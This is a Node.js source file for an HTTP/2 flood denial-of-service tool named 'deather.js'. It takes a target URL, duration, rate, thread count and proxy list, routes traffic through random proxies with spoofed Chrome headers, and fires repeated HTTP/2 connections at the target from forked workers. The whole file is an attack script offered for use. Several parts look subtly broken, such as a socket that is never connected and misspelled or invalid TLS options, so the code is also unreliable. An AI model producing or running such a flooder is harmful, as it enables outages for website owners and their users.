const net = require('net');
const http2 = require('http2');
const tls = require('tls');
const cluster = require('cluster');
const url = require('url');
const fs = require('fs');
const { HeaderGenerator } = require('header-generator');

process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (err) {});

if (process.argv.length < 7) {
    console.log('Usage: node deather.js target time rate thread proxyfile');
    process.exit();
}

const proxyList = readProxyFile(process.argv[6]);

function readProxyFile(filename) {
    return fs.readFileSync(filename, 'utf-8').toString().split(/\r?\n/);
}

function getRandomProxy(proxies) {
    return proxies[Math.floor(Math.random() * proxies.length)];
}

function generateRandomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const generateRandomIP = () => {
    const randomByte = () => Math.floor(Math.random() * 255);
    return `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;
}

const target = process.argv[2];
const time = parseInt(process.argv[3]);
const rate = parseInt(process.argv[4]);
const threads = parseInt(process.argv[5]);

let headerGenerator = new HeaderGenerator({
    browsers: [
        {
            name: 'chrome',
            minVersion: 80,
            maxVersion: 107,
            httpVersion: '2',
        },
    ],
    devices: ['desktop'],
    operatingSystems: ['windows'],
    locales: ['en-US', 'en'],
});

const headers = headerGenerator.getHeaders();

const cipherSuites = [
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
];

const sslCiphers = [
    'TLS_AES_128_GCM_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM',
    'TLS_AES_256_GCM_SHA384:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM',
    'TLS_CHACHA20_POLY1305_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM',
    'TLS_AES_128_CCM_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM',
    'TLS_AES_128_CCM_8_SHA256:AES128-GCM-SHA256:RSA+AES128-GCM-SHA256:HIGH:MEDIUM',
];

const targetUrl = url.parse(target);

if (cluster.isMaster) {
    for (let i = 1; i <= threads; i++) {
        cluster.fork();
    }
} else {
    setInterval(sendRequests, 1000);
}

class ProxyClient {
    HTTP(proxy, callback) {
        const [proxyHost, proxyPort] = proxy.address.split(':');

        const request = `CONNECT ${proxy.address}:443 HTTP/1.1\r\nHost: ${proxy.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const requestData = Buffer.from(request);

        const proxySocket = new net.Socket();

        proxySocket.setTimeout(proxy.timeout * 1000);
        proxySocket.setKeepAlive(true, 100000);

        proxySocket.on('connect', () => {
            proxySocket.write(requestData);
        });

        proxySocket.on('data', (data) => {
            const response = data.toString('utf-8');
            const isInvalidResponse =
                response.includes('HTTP/1.1 429') ||
                response.includes('HTTP/1.1 503') ||
                response.includes('HTTP/1.1 305') ||
                response.includes('HTTP/1.1 307') ||
                response.includes('HTTP/1.1 302') ||
                response.includes('HTTP/1.1 522');

            if (isInvalidResponse) {
                proxySocket.destroy();
                callback(undefined, 'error: invalid response from proxy server');
            } else {
                callback(proxySocket, undefined);
            }
        });

        proxySocket.on('timeout', () => {
            proxySocket.destroy();
            callback(undefined, 'error: timeout exceeded');
        });

        proxySocket.on('error', (error) => {
            proxySocket.destroy();
            callback(undefined, 'error: ' + error);
        });
    }
}

function sendRequests() {
    const randomProxy = getRandomProxy(proxyList);
    const [proxyHost, proxyPort] = randomProxy.split(':');
    const proxy = {
        host: proxyHost,
        port: parseInt(proxyPort),
        address: targetUrl.host + ':443',
        timeout: 100,
    };

    const proxyClient = new ProxyClient();
    proxyClient.HTTP(proxy, (socket, error) => {
        if (error) {
            return;
        }

        socket.setKeepAlive(true, 600000);

        const requestOptions = {
            host: targetUrl.host,
            ecdhCurve: 'prime256v1:X25519',
            ciphers: tls.getCiphers().join(':') + sslCiphers,
            secureProtocol: [
                'TLSv1_2_method',
                'TLSv1_3_method',
                'SSL_OP_NO_SSLv3',
                'SSL_OP_NO_SSLv2',
                'TLS_OP_NO_TLS_1_1',
                'TLS_OP_NO_TLS_1_0',
            ],
            sigals: cipherSuites,
            servername: targetUrl.host,
            challengesToSolve: Infinity,
            resolveWithFullResponse: true,
            cloudflareTimeout: 5000,
            cloudflareMaxTimeout: 30000,
            maxRedirects: Infinity,
            followAllRedirects: true,
            decodeEmails: false,
            gzip: true,
            rejectUnauthorized: false,
            ALPNProtocols: ['h2'],
            socket: socket,
        };

        const tlsSocket = tls.connect(443, targetUrl.host, requestOptions);
        tlsSocket.setKeepAlive(true, 100000);

        tlsSocket.on('connect', () => {
            const interval = setInterval(() => {
                for (let i = 0; i < rate; i++) {
                    const request = http2.connect(targetUrl.href, requestOptions);
                    request.on('response', (response) => {
                        request.close();
                        request.destroy();
                    });
                    request.end();
                }
            }, 1000);
        });

        tlsSocket.on('close', () => {
            tlsSocket.destroy();
            socket.destroy();
        });

        tlsSocket.on('error', (error) => {
            tlsSocket.destroy();
            socket.destroy();
        });
    });
}

const exit = () => process.exit(1);
setTimeout(exit, time * 1000);
